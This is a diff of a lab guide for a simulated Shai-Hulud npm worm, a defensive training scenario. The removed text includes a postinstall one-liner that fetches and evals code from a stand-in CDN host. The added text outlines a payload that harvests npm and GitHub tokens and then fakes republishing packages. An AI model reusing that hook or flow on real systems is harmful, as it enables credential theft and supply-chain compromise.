@@ -1,624 +1,159 @@
-# 🚀 Zero to Hero: Scenario 6 - Shai-Hulud Self-Replicating Attack
+# Zero to Hero: Scenario 6 - Shai-Hulud
 
-Welcome! This guide will take you from zero knowledge to successfully completing the Shai-Hulud self-replicating supply chain attack scenario. This is the most advanced scenario, covering one of the most sophisticated supply chain threats.
+This lab is the token-theft worm. You install one package, `shai-hulud`, and its `postinstall` reads your npm and GitHub tokens, then republishes every `@victim-org/*` package it finds in `package-lock.json`. Nothing leaves `127.0.0.1`. The payload only runs when `TESTBENCH_MODE=enabled`.
+
+If you still have notes that mention `data-processor`, `mock-cdn.js`, or `bundle.js`, throw them out. That was an older shape of this scenario. Scenario 07 is the one that still uses a package named `data-processor`.
 
 ## 📚 What You'll Learn
 
-By the end of this guide, you will:
-- Understand self-replicating supply chain attacks
-- Learn credential harvesting techniques
-- Execute a Shai-Hulud attack simulation (safely)
-- Understand post-install script exploitation
-- Detect and respond to self-replicating attacks
-- Implement comprehensive defenses
+- Why a publish token on a laptop is enough to turn one install into an ecosystem incident.
+- How the script picks targets: `@victim-org/` entries in `package-lock.json`, not a hardcoded package name.
+- Where the three evidence logs live, and what "harvest before republish" looks like in them.
+- What you would freeze first if this were a real maintainer machine.
 
-- Apply the **Mitigation Playbook** from this guide and the scenario README
 ---
 
 ## Table of Contents
 
 <div class="doc-toc">
 
-- [Part 1: Understanding Shai-Hulud (15 minutes)](#part-1-understanding-shai-hulud-15-minutes)
-- [Part 2: Prerequisites Check (5 minutes)](#part-2-prerequisites-check-5-minutes)
-- [Part 3: Setting Up Scenario 6 (15 minutes)](#part-3-setting-up-scenario-6-15-minutes)
-- [Part 4: Understanding the Legitimate Package (15 minutes)](#part-4-understanding-the-legitimate-package-15-minutes)
-- [Part 5: The Attack - Understanding Post-Install Scripts (20 minutes)](#part-5-the-attack---understanding-post-install-scripts-20-minutes)
-- [Part 6: Simulating the Attack (30 minutes)](#part-6-simulating-the-attack-30-minutes)
-- [Part 7: Self-Replication Simulation (25 minutes)](#part-7-self-replication-simulation-25-minutes)
-- [Part 8: Forensic Investigation (30 minutes)](#part-8-forensic-investigation-30-minutes)
-- [Part 9: Detection Methods (25 minutes)](#part-9-detection-methods-25-minutes)
-- [Part 10: Incident Response & Mitigation (30 minutes)](#part-10-incident-response--mitigation-30-minutes)
-- [Part 11: Understanding the Complete Attack Chain (15 minutes)](#part-11-understanding-the-complete-attack-chain-15-minutes)
-- [Code-level workflow](#code-level-workflow)
+- [Part 1: The workspace you are about to break](#part-1-the-workspace-you-are-about-to-break)
+- [Part 2: Setup](#part-2-setup)
+- [Part 3: Read the payload before you install](#part-3-read-the-payload-before-you-install)
+- [Part 4: Install it](#part-4-install-it)
+- [Part 5: What "four packages" looks like](#part-5-what-four-packages-looks-like)
+- [Part 6: Detection you can actually run](#part-6-detection-you-can-actually-run)
+- [Part 7: Containment, still inside the lab](#part-7-containment-still-inside-the-lab)
 - [Mitigation Playbook](#mitigation-playbook)
 - [Straightforward Implementation](#straightforward-implementation)
+- [Code-level workflow](#code-level-workflow)
 - [Elasticsearch + Kibana observability (optional)](#elasticsearch--kibana-observability-optional)
-- [Part 12: Clean Up and Next Steps (5 minutes)](#part-12-clean-up-and-next-steps-5-minutes)
-- [🆘 Troubleshooting](#🆘-troubleshooting)
-- [📚 Additional Resources](#📚-additional-resources)
-- [⚠️ Important Reminders](#⚠️-important-reminders)
-- [🎉 Congratulations!](#🎉-congratulations)
+- [Part 8: Clean Up](#part-8-clean-up)
+- [Troubleshooting](#troubleshooting)
+- [When you are done](#when-you-are-done)
 
 </div>
 
 ---
-## Part 1: Understanding Shai-Hulud (15 minutes)
+## Part 1: The workspace you are about to break
 
-### What is Shai-Hulud?
+`victim-app` is a private workspace. It depends on `shai-hulud` and on four packages the same team maintains:
 
-**Shai-Hulud** (named after the giant sandworms from Dune) is a self-replicating supply chain attack that has compromised hundreds of npm packages. This attack represents one of the most sophisticated and dangerous supply chain threats.
+- `@victim-org/victim-utils` at `1.0.0`
+- `@victim-org/victim-api` at `2.1.0`
+- `@victim-org/victim-logger` at `0.5.2`
+- `@victim-org/victim-auth` at `3.2.1`
 
-### Why It's Called "Self-Replicating"
+Those four live under `victim-app/packages/`. Their `package.json` files have no `postinstall`. The worm does not edit those files. It pretends to publish the next patch version, and it pretends to open a pull request on `github.com/victim-org/<name>`.
 
-Unlike other attacks that require manual intervention, Shai-Hulud **spreads automatically**:
-1. Compromises one package
-2. Harvests credentials from victims
-3. Uses stolen credentials to compromise more packages
-4. Repeats the cycle automatically
+The malicious code is `scenarios/06-sha-hulud/malicious-packages/shai-hulud/postinstall.js`.
 
-### Real-World Impact
-
-- **Hundreds of packages compromised** including those from:
-  - Zapier
-  - PostHog
-  - Postman
-  - Many other organizations
-- **Self-replicating nature** means the attack spreads automatically
-- **Credential theft** enables further attacks on victim organizations
-- **Difficult to detect** because packages appear legitimate
-
-### Attack Characteristics
-
-1. **Initial Compromise**: Attackers gain access to npm maintainer accounts
-2. **Malicious Post-Install**: Injects `postinstall` scripts that execute on package installation
-3. **Credential Harvesting**: Scans for and steals:
-   - GitHub tokens (`.npmrc`, environment variables)
-   - npm tokens
-   - Cloud provider secrets (AWS, Azure, GCP)
-   - CI/CD credentials
-4. **Exfiltration**: Uploads stolen credentials to public GitHub repositories
-5. **Self-Replication**: Uses stolen credentials to republish infected versions across other packages
-
----
-
-## Part 2: Prerequisites Check (5 minutes)
-
-Before we start, make sure you've completed:
-
-- ✅ Scenario 1 (Typosquatting)
-- ✅ Scenario 2 (Dependency Confusion)
-- ✅ Scenario 3 (Compromised Package)
-- ✅ Node.js 16+ and npm installed
-- ✅ TESTBENCH_MODE enabled
-
-Verify your setup:
-
-```bash
-node --version
-npm --version
-echo $TESTBENCH_MODE  # Should output: enabled
-```
-
----
-
-## Part 3: Setting Up Scenario 6 (15 minutes)
-
-### Step 1: Navigate to Scenario Directory
+## Part 2: Setup
 
 ```bash
 cd scenarios/06-sha-hulud
-```
-
-### Step 2: Run the Setup Script
-
-```bash
+export TESTBENCH_MODE=enabled
 ./setup.sh
 ```
 
-**What this does:**
-- Creates directory structure
-- Sets up legitimate package
-- Creates compromised package with postinstall script
-- Sets up victim application
-- Creates infrastructure components (mock CDN, credential harvester)
+`setup.sh` plants lookalike tokens in `victim-app/.npmrc`, `victim-app/.env`, and `~/.git-credentials`. They are lab fixtures. Do not point this scenario at a real npm token.
 
-**Expected output:**
-- Setup progress messages
-- Directories and files created
-- "Next Steps" displayed
-
-### Step 3: Understand the Environment
-
-**The Package**: `data-processor`
-- **Legitimate Version**: 1.2.0 (in `legitimate-package/`)
-- **Compromised Version**: 1.2.1 (in `compromised-package/`)
-- **Purpose**: Data transformation and processing utilities
-- **Weekly Downloads**: 5,000,000+
-- **Maintainer**: Jane Smith (compromised account)
-
-**The Attack Components:**
-- **Post-Install Script**: Executes automatically on `npm install`
-- **Bundle.js**: Obfuscated payload downloaded from CDN
-- **Credential Harvester**: Scans for and steals credentials
-- **GitHub Exfiltration**: Uploads stolen data to GitHub
-
----
-
-## Part 4: Understanding the Legitimate Package (15 minutes)
-
-### Step 1: Examine the Original Package
+You need three processes, all started from `infrastructure/`:
 
 ```bash
-cd legitimate-package/data-processor
-cat package.json
-cat index.js
+node credential-harvester.js &    # :3001  POST /collect
+node github-actions-simulator.js & # :3002  POST /backdoor-pr
+node mock-registry.js &           # :3003  POST /publish
 ```
 
-**What to notice:**
-- Clean, straightforward code
-- Simple data processing functions
-- No postinstall scripts
-- Version 1.2.0
+Leave that terminal up. If `:3001` is down, the harvest fails and you will stare at an empty file and blame the payload.
 
-**Package Details:**
-- Name: `data-processor`
-- Version: 1.2.0
-- Purpose: Data transformation and processing
-- Maintainer: Jane Smith (jane@example.com)
-
-### Step 2: Understand the Functionality
-
-The package provides:
-- Data transformation utilities
-- Processing functions
-- Common data operations
-
-This is a trusted, widely-used package.
-
----
-
-## Part 5: The Attack - Understanding Post-Install Scripts (20 minutes)
-
-### Step 1: What is a Post-Install Script?
-
-**Post-install scripts** are npm lifecycle hooks that run automatically after a package is installed. They're defined in `package.json`:
-
-```json
-{
-  "scripts": {
-    "postinstall": "node setup.js"
-  }
-}
-```
-
-**The Vulnerability:**
-- Post-install scripts run automatically
-- Users often don't review them
-- They execute with full permissions
-- Perfect for attackers!
-
-### Step 2: Examine the Compromised Package
+## Part 3: Read the payload before you install
 
 ```bash
-cd ../../compromised-package/data-processor
-cat package.json
+sed -n '1,160p' malicious-packages/shai-hulud/postinstall.js
 ```
 
-**Key Changes:**
-1. **Post-Install Script Added**: Downloads and executes `bundle.js`
-2. **Version Bump**: 1.2.0 → 1.2.1
-3. **Malicious Payload**: Hidden in downloaded bundle
+The gate is the first thing in `run()`: if `TESTBENCH_MODE` is not `enabled`, the function returns. After that the order is fixed.
 
-**The Post-Install Script:**
-```json
-{
-  "scripts": {
-    "postinstall": "node -e \"require('https').get('https://cdn.example.com/bundle.js', (r) => { let d=''; r.on('data', c=>d+=c); r.on('end', ()=>{eval(d)}) })\""
-  }
-}
-```
+1. Read `~/.npmrc` (fallback: the project `.npmrc`) for `_authToken`.
+2. Read `~/.git-credentials` (fallback: `victim-app/.env`) for a `ghp_` token.
+3. POST that harvest to `http://127.0.0.1:3001/collect`.
+4. Open `package-lock.json` and collect names that start with `@victim-org/`.
+5. For each name, POST a `malicious_publish` to `:3003/publish` and a `backdoor_pr` to `:3002/backdoor-pr`.
+6. POST `propagation_complete` back to the harvester.
 
-**What it does:**
-- Downloads `bundle.js` from attacker-controlled CDN
-- Executes the downloaded code
-- Runs automatically on every `npm install`
+Step 3 happens before step 5 on purpose. A detector that only watches registry writes misses the theft. A detector that only watches file reads misses the fan-out.
 
-### Step 3: Review the Malicious Bundle
+Also look at the lockfile so the target list is not a surprise:
 
 ```bash
-cat ../templates/bundle.js
+grep -n "@victim-org" victim-app/package-lock.json
 ```
 
-**What it does:**
-- Scans for `.npmrc` files (contains npm tokens)
-- Checks environment variables for API keys
-- Looks for GitHub tokens in common locations
-- Searches for cloud provider credentials
-- Exfiltrates all found credentials
-
-**Key Functions:**
-1. **File Scanning**: Searches for credential files
-2. **Environment Variable Harvesting**: Collects API keys
-3. **Credential Extraction**: Parses tokens and keys
-4. **Exfiltration**: Sends data to attacker server
-
----
-
-## Part 6: Simulating the Attack (30 minutes)
-
-### Step 1: Start Infrastructure
+## Part 4: Install it
 
 ```bash
-cd ../../infrastructure
-
-# Start mock CDN (serves bundle.js)
-node mock-cdn.js &
-
-# Start credential harvester (receives stolen credentials)
-node credential-harvester.js &
-
-# Start GitHub Actions simulator (simulates repository creation)
-node github-actions-simulator.js &
+cd victim-app
+export TESTBENCH_MODE=enabled
+npm install
 ```
 
-**What each component does:**
-- **Mock CDN**: Serves the malicious `bundle.js` payload
-- **Credential Harvester**: Receives and logs stolen credentials
-- **GitHub Simulator**: Simulates GitHub repository creation for exfiltration
+The install should succeed. `shai-hulud` still exports a tiny helper, and `npm start` still runs. That is the cover. The interesting lines are the `[shai-hulud] Phase 1` through `Phase 3` logs, and they only show up if the script actually ran.
 
-### Step 2: Install Compromised Package
+If you see `No lockfile found` or `Discovered 0 packages`, stop. `discoverTargetPackages` needs either `packages/<name>` entries or `node_modules/@victim-org/<name>` entries, and it reads the real `package.json` when the lockfile omits the `name` field. A lockfile that only has `node_modules/` links is enough, as long as those links are `@victim-org/*`.
+
+## Part 5: What "four packages" looks like
 
 ```bash
-cd ../../victim-app
-npm install ../compromised-package/data-processor
+curl -s http://127.0.0.1:3001/captured-credentials
+curl -s http://127.0.0.1:3003/published-packages
+curl -s http://127.0.0.1:3002/backdoor-prs
+node ../detection-tools/worm-status.js .
 ```
 
-**Observe what happens:**
-- The `postinstall` script executes automatically
-- `bundle.js` is downloaded from the mock CDN
-- Credential scanning occurs
-- Data is exfiltrated
+On the harvester, the first capture is `event: token_harvest` with truncated `npmToken` and `githubToken` fields. A later capture is `event: propagation_complete` with `packagesDiscovered` and `packagesInfecting`. I expect both counts to be 4.
 
-**You should see:**
-- Network requests during installation
-- Post-install script execution
-- Credential harvesting activity
+On the registry, `publishes` should name:
 
-### Step 3: Check Exfiltrated Data
+- `@victim-org/victim-utils` moving `1.0.0` to `1.0.1`
+- `@victim-org/victim-api` moving `2.1.0` to `2.1.1`
+- `@victim-org/victim-logger` moving `0.5.2` to `0.5.3`
+- `@victim-org/victim-auth` moving `3.2.1` to `3.2.2`
+
+The PR log uses the repo slug from each package's `repository.url`, so you get `victim-org/victim-utils` and the three siblings, branch `feat/dependency-bump`.
+
+Then diff your expectation against disk:
 
 ```bash
-# View captured credentials
-curl http://localhost:3001/captured-credentials
-
-# View GitHub repository creation logs
-curl http://localhost:3002/repo-logs
+grep -R postinstall packages/*/package.json || echo "local package.json files have no postinstall"
 ```
 
-**What was stolen:**
-- npm tokens from `.npmrc` (if present)
-- GitHub tokens from environment (if present)
-- AWS credentials (if present)
-- Other sensitive data
+That empty result is the teaching point. The maintainer's working tree looks fine. The registry history does not.
 
----
+## Part 6: Detection you can actually run
 
-## Part 7: Self-Replication Simulation (25 minutes)
-
-**The Critical Feature**: Using stolen credentials to spread
-
-### Step 1: Understand Replication Logic
-
-The attacker uses stolen npm tokens to:
-1. List all packages owned by the victim
-2. Publish new infected versions of each package
-3. Each new version contains the same malicious `postinstall` script
-4. Attack spreads automatically as users update packages
-
-### Step 2: Simulate Replication
+From `scenarios/06-sha-hulud`:
 
 ```bash
-cd ../infrastructure
-node replication-simulator.js
+node detection-tools/postinstall-monitor.js victim-app/node_modules/shai-hulud
+node detection-tools/credential-scanner.js victim-app
 ```
 
-**Observe:**
-- Packages owned by victim are identified
-- New versions are published to each package
-- Each version contains the same malware
-- Attack propagates across the ecosystem
+`DETECT.md` in this folder is the runbook: the Sigma sketch, the text rule, and the three files under `infrastructure/`. If Elasticsearch is up and you exported `SCAS_ES_URL=http://localhost:9200` before starting the harvester, the same harvest JSON is also in `scas-detections` with `scenario_id: 06`.
 
-### Step 3: Understand the Spread
+The hunt I want you to practice is correlation, not a single string. One `npm` process, credential-file reads, then N publishes where N is the number of `@victim-org` packages in the lockfile.
 
-**Attack Propagation:**
-```
-Package A (compromised) → Credentials stolen → Package B (compromised)
-                                                      ↓
-                                              Package C (compromised)
-                                                      ↓
-                                              Package D (compromised)
-```
+## Part 7: Containment, still inside the lab
 
-**Why it's dangerous:**
-- One compromise leads to many
-- Spreads automatically
-- Difficult to contain
-- Affects entire ecosystems
+You cannot revoke a real token here, and you should not try. Walk the list out loud:
 
----
+1. Revoke the npm token and the GitHub token. Assume every package that token could publish is suspect, which in this workspace is the four `@victim-org` names.
+2. `npm uninstall shai-hulud` and reinstall the app with `npm ci --ignore-scripts`.
+3. Freeze publishes. Look for versions that appeared during the install window. In the lab that window is the timestamps in `published-packages.json`.
+4. Review the backdoor PRs. In the lab they are rows in `backdoor-prs.json`, not GitHub.
 
-## Part 8: Forensic Investigation (30 minutes)
-
-**You're a security analyst**. Unusual activity has been reported. Investigate!
-
-### Investigation Step 1: Identify Suspicious Behavior
-
-```bash
-# Check npm install logs
-cat ~/.npm/_logs/*-debug.log | grep postinstall
-
-# Monitor network traffic
-../../detection-tools/network-monitor.sh
-
-# Check for unexpected GitHub repository creation
-curl http://localhost:3002/repo-logs
-```
-
-**Red Flags:**
-- Unexpected network connections during install
-- Post-install scripts in packages that shouldn't have them
-- New GitHub repositories created automatically
-- Unusual outbound connections
-
-### Investigation Step 2: Package Analysis
-
-```bash
-# Compare package versions
-diff -ur ../legitimate-package/data-processor ../compromised-package/data-processor
-
-# Check package.json for postinstall scripts
-cat node_modules/data-processor/package.json | grep -A 5 scripts
-```
-
-**What to Look For:**
-- New `postinstall` scripts
-- Suspicious dependencies
-- Obfuscated code
-- Network requests in install scripts
-- CDN downloads during installation
-
-### Investigation Step 3: Bundle.js Analysis
-
-```bash
-# Download and examine bundle.js
-curl http://localhost:3000/bundle.js > bundle.js
-cat bundle.js
-
-# Look for obfuscation
-node -e "console.log(require('fs').readFileSync('bundle.js', 'utf8'))"
-```
-
-**Analysis Questions:**
-- What does the code do?
-- How is it obfuscated?
-- What credentials is it looking for?
-- Where does it exfiltrate data?
-
-### Investigation Step 4: Timeline Reconstruction
-
-```bash
-# Check npm registry for publish history (simulated)
-# npm view data-processor time
-
-# Check for rapid version bumps
-# npm view data-processor versions
-
-# Check maintainer changes
-# npm owner ls data-processor
-```
-
-**Build Timeline:**
-- When was the package compromised?
-- How many versions are affected?
-- Who published the malicious versions?
-- How long was it active?
-
----
-
-## Part 9: Detection Methods (25 minutes)
-
-Implement multiple detection layers:
-
-### Detection 1: Post-Install Script Monitoring
-
-```bash
-cd ../../detection-tools
-node postinstall-monitor.js
-```
-
-Monitor for:
-- Unexpected `postinstall` scripts
-- Network requests during install
-- File system access during install
-
-### Detection 2: Credential Scanning
-
-```bash
-# Scan for exposed credentials
-node credential-scanner.js ../../victim-app
-```
-
-Check for:
-- `.npmrc` files with tokens
-- Environment variables with API keys
-- Hardcoded credentials
-
-### Detection 3: Package Integrity Checking
-
-```bash
-# Verify package checksums
-npm audit
-
-# Check for known malicious patterns
-node malware-signature-scanner.js data-processor
-```
-
-### Detection 4: Behavioral Analysis
-
-Monitor for:
-- Unusual GitHub repository creation
-- Rapid package version bumps
-- Multiple packages updated by same maintainer
-- Network traffic to suspicious domains
-
----
-
-## Part 10: Incident Response & Mitigation (30 minutes)
-
-**The package has been confirmed as compromised. Respond!**
-
-### Response Step 1: Immediate Containment
-
-```bash
-# 1. Revoke all npm tokens
-npm token revoke-all
-
-# 2. Remove compromised packages
-npm uninstall data-processor
-
-# 3. Clear caches
-npm cache clean --force
-
-# 4. Block malicious CDN
-echo "127.0.0.1 cdn.example.com" >> /etc/hosts
-```
-
-### Response Step 2: Impact Assessment
-
-```bash
-# Find all affected projects
-# node scripts/find-affected-projects.js data-processor
-
-# Check which versions are affected
-# npm view data-processor versions
-
-# Identify compromised versions: 1.2.1, 1.2.2, 1.2.3
-```
-
-### Response Step 3: Credential Rotation
-
-**CRITICAL**: All stolen credentials must be rotated immediately:
-
-1. **npm Tokens**:
-   ```bash
-   npm token revoke-all
-   npm token create
-   ```
-
-2. **GitHub Tokens**:
-   - Revoke in GitHub Settings → Developer settings → Personal access tokens
-   - Create new tokens with minimal permissions
-
-3. **Cloud Credentials**:
-   - Rotate AWS access keys
-   - Rotate Azure service principals
-   - Rotate GCP service account keys
-
-### Response Step 4: Package Remediation
-
-**Option A: Pin to Safe Version**
-```json
-{
-  "dependencies": {
-    "data-processor": "1.2.0"  // Last known good version
-  }
-}
-```
-
-**Option B: Replace Package**
-```bash
-npm uninstall data-processor
-npm install alternative-data-processor
-```
-
-**Option C: Internal Fork**
-```bash
-# Create internal fork from safe version
-git clone https://github.com/original/data-processor
-cd data-processor
-git checkout v1.2.0
-# Publish to internal registry
-```
-
-### Response Step 5: Prevention
-
-Implement preventive measures:
-
-1. **2FA Enforcement**:
-   - Enable 2FA on all npm accounts
-   - Require 2FA for package publishing
-
-2. **Post-Install Script Restrictions**:
-   ```json
-   {
-     "config": {
-       "ignore-scripts": true
-     }
-   }
-   ```
-
-3. **Automated Scanning**:
-   ```yaml
-   # .github/workflows/security.yml
-   - name: Security Audit
-     run: |
-       npm audit --audit-level=moderate
-       npm run security-scan
-   ```
-
-4. **Credential Management**:
-   - Use secret management tools (HashiCorp Vault, AWS Secrets Manager)
-   - Never commit credentials to repositories
-   - Rotate credentials regularly
-
-5. **Package Lock Enforcement**:
-   ```bash
-   # Use npm ci instead of npm install
-   npm ci --audit
-   ```
-
----
-
-## Part 11: Understanding the Complete Attack Chain (15 minutes)
-
-### The Full Attack Flow
-
-1. **Initial Compromise**: Attacker gains npm maintainer account access
-2. **Package Modification**: Adds malicious `postinstall` script
-3. **Version Publishing**: Publishes new version (1.2.1)
-4. **User Installation**: Users install/update package
-5. **Post-Install Execution**: `postinstall` script runs automatically
-6. **Bundle Download**: Downloads `bundle.js` from CDN
-7. **Credential Harvesting**: Scans for and steals credentials
-8. **Exfiltration**: Uploads credentials to GitHub
-9. **Self-Replication**: Uses stolen credentials to compromise more packages
-10. **Spread**: Attack propagates across ecosystem
-
-### Why It's So Dangerous
-
-- **Self-Replicating**: Spreads automatically without manual intervention
-- **Credential Theft**: Amplifies impact by enabling further attacks
-- **Stealth**: Packages appear legitimate
-- **Scale**: One compromise leads to many
-- **Persistence**: Difficult to completely eradicate
-
----
-
-## Code-level workflow
-
-![Scenario 06 code-level workflow: Shai-Hulud (Self-Replicating)](../../assets/diagrams/codeflow/svg/scas-codeflow-scenario-06.svg)
-
-*Code-level workflow for Scenario 06. Editable source: [`scas-codeflow-scenario-06.excalidraw`](../../assets/diagrams/codeflow/excalidraw/scas-codeflow-scenario-06.excalidraw). Regenerate with `node scripts/diagrams/generate-scenario-codeflow-diagrams.js`.*
+The control that breaks the loop is boring: do not keep the publish token in a home directory. The `postinstall` can still run. It just finds nothing worth republishing.
 
 ## Mitigation Playbook
 
@@ -638,11 +173,17 @@ The full step-by-step implementation flow lives in the [scenario README](../../.
 
 ---
 
+## Code-level workflow
+
+![Scenario 06 code-level workflow: Shai-Hulud (Self-Replicating)](../../assets/diagrams/codeflow/svg/scas-codeflow-scenario-06.svg)
+
+*Code-level workflow for Scenario 06. Editable source: [`scas-codeflow-scenario-06.excalidraw`](../../assets/diagrams/codeflow/excalidraw/scas-codeflow-scenario-06.excalidraw). Regenerate with `node scripts/diagrams/generate-scenario-codeflow-diagrams.js`.*
+
 ## Elasticsearch + Kibana observability (optional)
 
 Scenario **06 - Shai-Hulud (Self-Replicating)** is indexed in Elasticsearch when the observability stack is running.
 
-Shai-Hulud simulation: postinstall on data-processor harvests credentials to credential-harvester :3001.
+Shai-Hulud: shai-hulud postinstall harvests tokens, then republishes every @victim-org package in the lockfile.
 
 - **Detection runbook (static)** → index `scas-rules`, document id `06` - IOCs, Sigma, YARA, sample logs from `DETECT.md`
 - **Runtime captures (dynamic)** → index `scas-detections` - one document per exfil event when `SCAS_ES_URL` is set before starting the mock collector
@@ -674,7 +215,7 @@ sequenceDiagram
     autonumber
     participant Learner as Learner (you)
     participant Victim as victim-app
-    participant MalPkg as data-processor (postinstall)
+    participant MalPkg as shai-hulud (postinstall)
     participant Mock as credential-harvester :3001
     participant ES as Elasticsearch :9200
     participant Kibana as Kibana :5601
@@ -682,16 +223,17 @@ sequenceDiagram
     Note over Learner,Mock: Phase 1 - Start collectors (Terminal A)
     Learner->>Mock: export TESTBENCH_MODE=enabled
     Learner->>Mock: export SCAS_ES_URL=http://localhost:9200 (optional)
-    Learner->>Mock: cd infrastructure && node credential-harvester.js
+    Learner->>Mock: cd infrastructure && node credential-harvester.js & node github-actions-simulator.js & node mock-registry.js
     Mock->>Mock: Listen for exfil POST on localhost
 
     Note over Learner,MalPkg: Phase 2 - Run the lab (Terminal B)
     Learner->>Learner: export TESTBENCH_MODE=enabled
     Learner->>Learner: export SCAS_ES_URL=http://localhost:9200 (optional)
-    Learner->>Victim: npm install ../compromised-package/data-processor
-    Victim->>MalPkg: npm lifecycle runs postinstall script
-    MalPkg->>MalPkg: Scan for tokens / npmrc paths (simulated)
-    Learner->>Victim: npm start (optional second-stage behavior)
+    Learner->>Victim: cd victim-app && npm install
+    Victim->>MalPkg: npm lifecycle runs shai-hulud postinstall.js
+    MalPkg->>Mock: POST harvested npm and GitHub tokens to :3001/collect
+    MalPkg->>MalPkg: Read package-lock.json for @victim-org/*
+    MalPkg->>Mock: POST /publish :3003 and /backdoor-pr :3002 once per package
 
     Note over MalPkg,Mock: Phase 3 - Simulated exfiltration (127.0.0.1 only)
     Note over MalPkg: Malicious path gated by TESTBENCH_MODE=enabled
@@ -723,10 +265,11 @@ Same Phase-2 path as the diagrams above (for skimming / accessibility).
 
 | # | From | To | Action |
 |---|------|----|--------|
-| 1 | Learner | Victim | npm install ../compromised-package/data-processor |
-| 2 | Victim | MalPkg | npm lifecycle runs postinstall script |
-| 3 | MalPkg | MalPkg | Scan for tokens / npmrc paths (simulated) |
-| 4 | Learner | Victim | npm start (optional second-stage behavior) |
+| 1 | Learner | Victim | cd victim-app && npm install |
+| 2 | Victim | MalPkg | npm lifecycle runs shai-hulud postinstall.js |
+| 3 | MalPkg | Mock | POST harvested npm and GitHub tokens to :3001/collect |
+| 4 | MalPkg | MalPkg | Read package-lock.json for @victim-org/* |
+| 5 | MalPkg | Mock | POST /publish :3003 and /backdoor-pr :3002 once per package |
 
 ### Prerequisites
 
@@ -745,7 +288,7 @@ From the repository root:
 cd scenarios/06-sha-hulud
 export TESTBENCH_MODE=enabled
 export SCAS_ES_URL=http://localhost:9200
-cd infrastructure && node credential-harvester.js
+cd infrastructure && node credential-harvester.js & node github-actions-simulator.js & node mock-registry.js
 ```
 
 **Terminal B - execute the lab:**
@@ -754,15 +297,15 @@ cd infrastructure && node credential-harvester.js
 cd scenarios/06-sha-hulud
 export TESTBENCH_MODE=enabled
 export SCAS_ES_URL=http://localhost:9200
-cd victim-app && npm install ../compromised-package/data-processor && npm start
+cd victim-app && npm install && npm start
 ```
 
-> **Note:** Also runs mock-cdn :3000 and github-actions-simulator :3002 for replication simulation.
+> **Note:** Harvester :3001, GitHub sim :3002, mock registry :3003. One install fans out to every @victim-org package in package-lock.json.
 
 ### Verify locally (file-based evidence)
 
 ```bash
-curl -s http://localhost:3001/captured-credentials
+curl -s http://localhost:3001/captured-credentials; curl -s http://localhost:3003/published-packages; curl -s http://localhost:3002/backdoor-prs
 ```
 
 ### Verify in Elasticsearch (API)
@@ -790,106 +333,28 @@ curl -s "http://localhost:9200/scas-detections/_search?pretty" \
 
 See [observability/README.md](../../../observability/README.md) for stack details.
 
-## Part 12: Clean Up and Next Steps (5 minutes)
+## Part 8: Clean Up
 
-### Clean Up
+Stop the three node processes in the infrastructure terminal. From the repo root, `scripts/setup/teardown.sh` also frees the lab ports if you lost track of the PIDs.
 
 ```bash
-# Stop all infrastructure services
-# ps aux | grep -E "mock-cdn|credential-harvester|github-actions"
-# kill <PIDs>
+cd victim-app
+rm -rf node_modules
 ```
 
-### What You've Accomplished
+Leave the scenario source alone. The next person needs `postinstall.js` and the four package folders.
 
-✅ Understood self-replicating supply chain attacks  
-✅ Executed a Shai-Hulud attack simulation (safely)  
-✅ Understood credential harvesting techniques  
-✅ Conducted forensic investigation  
-✅ Performed comprehensive incident response  
-✅ Implemented detection and prevention strategies  
+## Troubleshooting
 
-### Next Steps
+| What you saw | What it usually means |
+|--------------|------------------------|
+| No `[shai-hulud]` lines | `TESTBENCH_MODE` was unset, or `ignore-scripts` is true |
+| Harvest empty, phases still printed | Harvester was not listening on 3001, or setup did not plant the fixture tokens |
+| `Discovered 0 packages` | Lockfile has no `@victim-org/` link. Run `npm install` once so npm writes `node_modules/@victim-org/*` entries, then install again if the script already exited |
+| Publishes for `victim-utils` only | You are on an old checkout that hardcoded one package. This tree fans out from the lockfile |
+| `worm-status.js` complains about port 3005 | The network monitor is optional. Publishes and PRs still come from 3003 and 3002 |
+| Registry log says `PUBLISH REJECTED: missing_token` | The harvest did not find `_authToken`. Re-run `./setup.sh`, then install again. The script sends that token as `Authorization: Bearer` |
 
-1. **Review Other Scenarios**: Compare different attack vectors
-2. **Experiment**: Try different obfuscation techniques
-3. **Read More**: Study real-world Shai-Hulud incidents
-4. **Practice**: Implement detection in a real project
+## When you are done
 
----
-
-## 🆘 Troubleshooting
-
-### Problem: "Post-install script not executing"
-
-**Solution:**
-```bash
-# Check if scripts are disabled
-npm config get ignore-scripts
-
-# Enable scripts if needed
-npm config set ignore-scripts false
-
-# Reinstall
-npm install ../compromised-package/data-processor
-```
-
-### Problem: "Bundle.js not downloading"
-
-**Solution:**
-```bash
-# Verify mock CDN is running
-curl http://localhost:3000/bundle.js
-
-# Check network connectivity
-# Restart mock CDN if needed
-```
-
-### Problem: "No credentials captured"
-
-**Solution:**
-```bash
-# Create test .npmrc file
-echo "//registry.npmjs.org/:_authToken=test-token" > ~/.npmrc
-
-# Set test environment variables
-export GITHUB_TOKEN=test-github-token
-export AWS_ACCESS_KEY_ID=test-aws-key
-
-# Reinstall package
-npm install ../compromised-package/data-processor
-```
-
----
-
-## 📚 Additional Resources
-
-- **Main README**: `README.md`
-- **Scenario README**: `scenarios/06-sha-hulud/README.md`
-- **Microsoft Security Blog**: Shai-Hulud 2.0 research
-- **npm Security Best Practices**: https://docs.npmjs.com/security
-
----
-
-## ⚠️ Important Reminders
-
-- ✅ This is for **EDUCATIONAL purposes only**
-- ✅ Use **ONLY in isolated environments**
-- ✅ **Never** deploy malicious code to production
-- ✅ **Always** set `TESTBENCH_MODE=enabled`
-- ✅ **Never** test on systems you don't own
-
----
-
-## 🎉 Congratulations!
-
-You've completed the Shai-Hulud self-replicating attack scenario! You now understand:
-- How self-replicating attacks work
-- How credential harvesting enables spread
-- How to detect these sophisticated attacks
-- How to respond comprehensively
-- How to prevent future compromises
-
-**Remember**: Self-replicating attacks are extremely dangerous. Defense in depth is essential!
-
-Happy learning! 🔐
+You should be able to point at the lockfile, name the four packages, and say which curl proves the harvest versus which curl proves the republish. Next lab in the catalog is 07, and it is a different bug: a transitive `data-processor`, not this worm.
